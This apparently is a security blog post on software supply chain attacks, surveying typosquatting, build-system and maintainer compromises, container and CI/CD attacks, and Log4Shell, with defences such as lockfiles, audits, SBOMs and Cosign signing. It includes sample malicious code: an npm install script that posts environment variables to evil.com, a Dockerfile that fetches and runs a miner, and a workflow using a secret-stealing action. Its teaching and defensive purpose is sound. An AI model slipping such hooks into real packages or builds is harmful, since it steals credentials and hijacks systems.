Supply Chain Attacks: How They Happen and What Actually Works to Stop Them

Management: Our own code is secure. Dependencies from npm, GitHub, Docker Hub. That’s safe, right?

Sysadmin: That’s where most attacks actually happen.

Management: But those maintainers are legit companies!

Sysadmin: So were SolarWinds and Log4j maintainers. What’s your point?

"The attack surface isn't what you wrote. It's everything you trusted. And you trusted a lot."

We obsess over secure coding practices. Input validation, authentication, access controls. But then we pull in 2000 dependencies from npm, PyPI, Docker Hub. We download images, run unverified binaries, trust package maintainers we’ve never met.

That’s where supply chain attacks live. Not in your code. In everyone else’s.

The Supply Chain Problem#

Your application isn’t just your code. It’s your code + every dependency, every library, every container image, every tool in your build pipeline. Each one is a potential attack vector.

The attack surface:

Your Application
├── npm dependencies (hundreds of packages)
├── Python packages (more packages)
├── Docker images (base images + layers)
├── CI/CD tools (GitHub Actions, build scripts)
└── Transitive dependencies (dependencies of dependencies)

Every single one of these could be:
- Compromised maintainer
- Typosquatted package name
- Malicious version bump
- Hijacked repository
- Vulnerable transitive dependency

You review your code. Do you review every line of every dependency? Every layer of every container image? Every GitHub Action used in your pipeline?

That’s the supply chain problem.

Attack Types (With Real Examples)#

1. Typosquatting#

Attacker publishes a package with a name that looks legitimate but has a typo.

Example: crossenv vs cross-env

In 2017, a security researcher discovered crossenv - a malicious npm package designed to look like the popular cross-env package. It harvested environment variables and sent them to attacker-controlled server.

// Malicious package.json
{
  "name": "crossenv",  // Looks like cross-env
  "version": "1.0.0",
  "scripts": {
    "install": "node -e \"require('child_process').exec('curl -X POST https://evil.com/steal -d \\\"`+JSON.stringify(process.env)+`\\\"');\""
  }
}

How it works:

  1. Developer types npm install crossenv (typo)
  2. Malicious package installs, runs install script
  3. Environment variables (AWS keys, database URLs, API tokens) exfiltrated
  4. Attack waits for stolen credentials

Mitigation:

  • Lock your dependencies (package-lock.json, requirements.txt)
  • Audit new dependencies before install
  • Use tools like npm audit, pip-audit
  • Two-factor authentication for npm/pypi publishing

2. Build System Compromise#

Attacker compromises the build pipeline of a legitimate software vendor, injecting malicious code into official releases.

Example: SolarWinds Attack (2020)

This was the attack that woke everyone up. SolarWinds Orion platform was compromised through a malicious update inserted during the build process.

What happened:

  1. Attackers compromised SolarWinds build system
  2. Inserted malicious code into Orion.Core.dll
  3. Validly signed with SolarWinds certificate
  4. Distributed as update 2020.2.1 HF
  5. Installed by 18,000+ customers worldwide

Result: Attackers gained access to US government agencies, Fortune 500 companies, critical infrastructure.

Why it worked:

  • Package was legitimately signed (maintainer trust)
  • Came from official update channel (infrastructure trust)
  • Looked like normal update (no red flags)

Mitigation:

  • Verify signatures against multiple sources
  • Monitor maintainers’ own security posture
  • Delay updates by testing in staging
  • Implement integrity verification (SBOMs, checksums)

Related: See my post on Canary Tokens for early detection when prevention fails.

3. Maintainer Account Hijacking#

Attacker compromises maintainer’s account, publishes malicious package.

Example: event-stream npm package (2018)

Popular npm package event-stream was compromised after the original maintainer handed over control to a new contributor who then injected malicious code targeting the Copay Bitcoin wallet.

What happened:

  1. Original maintainer handed over repository control to a new contributor
  2. New contributor added a malicious dependency (flatmap-stream)
  3. Malicious code targeted Copay Bitcoin wallet specifically
  4. Cryptocurrency wallets drained from Copay users

Detection: Users noticed unusual behavior. Package had 2 million weekly downloads.

Mitigation:

  • Maintainers should use hardware keys for signing
  • Enable two-factor authentication on npm/PyPI/GitHub
  • Monitor maintainers’ accounts for suspicious activity
  • Don’t auto-update critical dependencies without review

4. Container Image Attacks#

Attacker compromises Docker base image or adds malicious layer.

Example: Docker Hub Image Exploits

Multiple incidents where Docker images were compromised:

Case 1: Docker Hub breach (2019)

  • Docker Hub itself was breached, exposing 190,000 accounts
  • Attackers gained access to tokens and credentials
  • Potentially affected builds pulling from compromised accounts

Case 2: Bitcoin-stealing images (ongoing)

  • Images that mine cryptocurrency on deployment
  • Hidden in legitimate-looking base images
  • Organizations pay for unknowingly running miners

Example malicious Dockerfile:

FROM node:16

# Hidden in legitimate-looking install
RUN curl -o /tmp/crypto-miner https://evil.com/miner && \
    chmod +x /tmp/crypto-miner && \
    /tmp/crypto-miner --background && \
    rm -f /tmp/crypto-miner

# Normal application setup continues...
COPY . /app
RUN npm install
CMD ["node", "index.js"]

Detection: Unusual CPU usage in containers. Mining runs continuously.

Mitigation:

  • Pull from official registries only (Docker Hub official images)
  • Verify image signatures (Docker Content Trust)
  • Use SBOMs (Software Bill of Materials)
  • Build your own base images when possible
  • Scan images with tools like Trivy, Clair

5. CI/CD Pipeline Injection#

Attacker compromises GitHub Actions, Dockerfile, or build script.

Example: GitHub Actions Token Theft

Common pattern:

  1. Repository uses fork of popular template
  2. Template has vulnerable GitHub Action
  3. Action logs GITHUB_TOKEN to attacker-controlled server
  4. Attacker uses token to modify repositories, steal secrets

Example vulnerable GitHub Action:

name: CI
on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Debug build
        run: |
          # Oops, this logs environment variables
          env
          
      - name: Deploy
        # Attacker-controlled action
        uses: attacker/malicious-action@v1
        with:
          # This action exfiltrates GITHUB_TOKEN
          api-key: ${{ secrets.API_KEY }}

Mitigation:

  • Use permissions: field in GitHub Actions to limit token access
  • Don’t use third-party actions from untrusted sources
  • Review Action source code
  • Don’t log secrets or environment variables
  • Use OIDC for authentication instead of static secrets

6. Transitive Dependency Attacks#

Attack a dependency’s dependency, not the direct dependency.

Example: eslint-scope Attack (2018)

Attacker compromised eslint-scope package, which was a dependency of thousands of projects.

What happened:

  1. eslint-scope was a transitive dependency of popular packages
  2. Attackers compromised maintainer account
  3. Published malicious version 3.0.0
  4. Any project depending on affected packages got malicious code

The problem: Your project doesn’t directly depend on eslint-scope. But one of your dependencies does. You’re still vulnerable.

Mitigation:

  • Lock dependency tree completely
  • Regularly run npm audit, pip-audit, cargo audit
  • Use tools that scan entire dependency tree (Snyk, Dependabot)
  • Update dependencies regularly (but test in staging first)

Example: Log4Shell (CVE-2021-44228)

Log4j wasn’t a malicious package. That’s what made it worse.

It was a widely trusted logging library, pulled into everything from Java apps to vendor appliances. In practice it behaved like a transitive dependency attack because:

  • You often didn’t know you had Log4j at all (it came in via something else)
  • You couldn’t patch it directly (you had to patch the thing that bundled it)
  • You ended up with multiple copies in weird places (fat JARs, shaded deps, vendor installers)

What actually broke:

  • A logged string could trigger a network lookup and load code via JNDI
  • Attackers sprayed it into anything that might get logged (HTTP headers, usernames, chat messages)
  • Your defence depended as much on outbound network controls as it did on patching

Why it was hard:

  • Asset inventory was missing (nobody could answer “where is Log4j used?”)
  • Patching meant rebuilding and redeploying a lot of things
  • Some vendor products needed a vendor patch, and your timeline wasn’t your own

Mitigation that worked in real life:

  • Patch/upgrade fast (and verify the deployed version, don’t trust the ticket)
  • Block unnecessary outbound LDAP/RMI/DNS from app servers (you don’t need most of that)
  • Use SBOMs so next time you can answer “where is it?” in minutes, not days

Practical Mitigation Framework#

Tier 1: Fundamentals (Do This Immediately)#

1. Dependency Locking

# npm
npm install --package-lock-only

# Python
pip freeze > requirements.txt

# Go
go mod vendor

# Rust
cargo generate-lockfile

This locks exact versions, prevents typosquatting and accidental updates.

2. Dependency Auditing

# npm
npm audit
npm audit fix

# Python
pip-audit

# Go
go list -json -m all | nancy sleuth

# Docker
trivy image your-image:tag

Run these regularly, preferably in CI/CD.

3. Two-Factor Authentication Enable 2FA on:

  • npm
  • PyPI
  • GitHub
  • Docker Hub
  • GitLab

Maintainer accounts should use hardware security keys (YubiKeys, etc.)

Tier 2: Advanced (Do This If You Have Resources)#

1. SBOMs (Software Bill of Materials) Track all dependencies, including transitive ones.

Don’t treat this as paperwork. Treat it as your “where is Log4j?” button.

Generate an SBOM for a container image:

syft your-image:tag -o cyclonedx-json=sbom.cdx.json

Or for a repo/build output directory:

syft dir:. -o cyclonedx-json=sbom.cdx.json

Then scan the SBOM:

grype sbom:sbom.cdx.json

Practical workflow:

  • Generate SBOM in CI for every build
  • Store it next to the artifact/image
  • Fail the build on high/critical findings you care about
  • When the next Log4Shell happens, you query SBOMs instead of grepping random servers

2. Private Package Registries Mirror public packages to private registry:

# npm
.npmrc:
registry=https://npm.yourcompany.com/

# Python
pip install --index-url https://pypi.yourcompany.com/simple/

Curate what gets into your registry. Block malicious packages.

3. Sigstore / Cosign Sign your artifacts:

# Keyless signing (recommended if you're already on GitHub Actions/OIDC)
cosign sign --keyless your-image:tag

# Verify by identity and issuer (this is what you enforce)
cosign verify \
  --certificate-identity "https://github.com/ORG/REPO/.github/workflows/build.yml@refs/heads/main" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  your-image:tag

You can also attach the SBOM as an attestation:

syft your-image:tag -o cyclonedx-json=sbom.cdx.json
cosign attest --keyless --predicate sbom.cdx.json --type cyclonedx your-image:tag

cosign verify-attestation \
  --type cyclonedx \
  --certificate-identity "https://github.com/ORG/REPO/.github/workflows/build.yml@refs/heads/main" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  your-image:tag

Integrate signature verification into CI/CD pipeline.

Tier 3: Operational (Make This Part of Your Process)#

1. Dependency Review Process Before adding new dependency:

  • Check maintainer reputation
  • Review recent commits
  • Look at open issues
  • Check security advisories
  • Verify project has active maintenance

2. Update Testing Never auto-update dependencies to production:

  • Update in staging environment first
  • Run full test suite
  • Monitor for unusual behavior
  • Gradual rollout to production (canary deployment)

3. Incident Response Plan When supply chain attack is suspected:

  1. Isolate affected systems
  2. Rotate all credentials
  3. Review all builds from time period
  4. Audit logs for unusual activity
  5. Rebuild from trusted source if needed
  6. Communicate transparently with users

Real-World Defense Stories#

Case 1: “Frozen installs” prevented a bad day#

Team had a habit of running npm install directly on build agents.

They changed to:

  • npm ci (lockfile required, clean install)
  • --ignore-scripts on CI for builds that shouldn’t run arbitrary install hooks

Result: a typo in a PR couldn’t silently pull in a new package and run an install script. The build failed loudly instead of doing something “helpful”.

Case 2: Pinning GitHub Actions to commits stopped supply chain drift#

This is boring, and it works.

Instead of:

- uses: some-org/some-action@v3

They pinned to a commit SHA:

- uses: some-org/some-action@3a2f9c1d8a6b9b9d0d3c9b1b6b9c1d8a6b9b9d0d

Result: a compromised tag couldn’t silently change what ran in CI.

Case 3: Base images became a product, not a random download#

Team stopped pulling random base images in production builds.

They:

  1. Built a small set of internal base images (one for each runtime)
  2. Scanned them (Trivy/Grype)
  3. Signed them (Cosign)
  4. Forced all app builds to use only those images

Result: when a new CVE landed, they rebuilt a handful of base images and the fleet inherited the fix on the next deploy.

Result: Zero container supply chain incidents in 2 years.

Trade-off: More maintenance, but complete control.

Common Mistakes#

Mistake 1: Trusting Package Stars or Downloads#

Popular doesn’t mean secure. Malicious packages can:

  • Purchase stars (GitHub services exist for this)
  • Use bot networks to download
  • Look legitimate but contain backdoors

Better: Review maintainer, code quality, security posture.

Mistake 2: Ignoring Dev Dependencies#

Security scanners often miss dev dependencies (test frameworks, linting tools, etc.). These can be compromised too.

Example: eslint dev dependency could steal your source code.

Better: Scan all dependencies, not just production ones.

Mistake 3: No Visibility Into Dependency Tree#

You depend on package A. Package A depends on B. Package B depends on C. C is compromised.

You’re vulnerable even though you never installed C.

Better: Use tools that scan entire dependency tree (Snyk, Dependabot, npm audit).

Mistake 4: Assuming Open Source Means Safe#

Anyone can publish to npm, PyPI, etc. There’s no security review before publication.

Open source allows code review, but doesn’t guarantee it happened.

Better: Treat all packages with skepticism. Verify before trust.

Monitoring and Detection#

What to Monitor#

Dependency vulnerabilities:

  • Dependabot alerts (GitHub)
  • Snyk, WhiteSource, similar tools
  • OS package managers (apt, yum) security updates

Unusual behavior:

  • Unexpected CPU usage (cryptocurrency mining)
  • Network traffic to unknown endpoints (data exfiltration)
  • New files or processes in containers

Maintainer activity:

  • Maintainer publishes suspicious package
  • Maintainer account compromised (social engineering, credential theft)
  • Repository ownership changes

Detection Tools#

npm:

npm audit            # Check for known vulnerabilities
npm audit fix        # Fix automatically
npm outdated         # Check for updates

Python:

pip-audit            # Audit dependencies
pip list --outdated   # See what you're falling behind on

Go:

go list -json -m all | nancy sleuth    # Vulnerability scanner
govulncheck                              # Check for vulnerabilities

Docker:

trivy image your-image:tag         # Scan image
grype your-image:tag               # Scan image

The Honest Reality#

Prevention isn’t enough. You will miss things. Supply chain is too large, too complex, too adversarial.

You need:

  1. Detection - Monitor dependencies, unusual behavior, alerts
  2. Resilience - Assume compromise, plan for it
  3. Rapid response - When attack happens, react fast

Canary tokens help. They detect when attackers use compromised dependencies. See previous post for details.

Zero trust helps. Don’t blindly trust packages, images, maintainers. Verify everything.

Process matters more than tools. The best security tools don’t help if you:

  • Ignore alerts
  • Don’t review new dependencies
  • Auto-update to production
  • Have no incident response plan

Supply chain attacks aren’t going away. They’re too profitable, too effective. Your job isn’t to eliminate risk (impossible). It’s to reduce it, detect it quickly, and respond effectively when it happens.

Because the attackers will find a way in. The question is: will you notice in time?
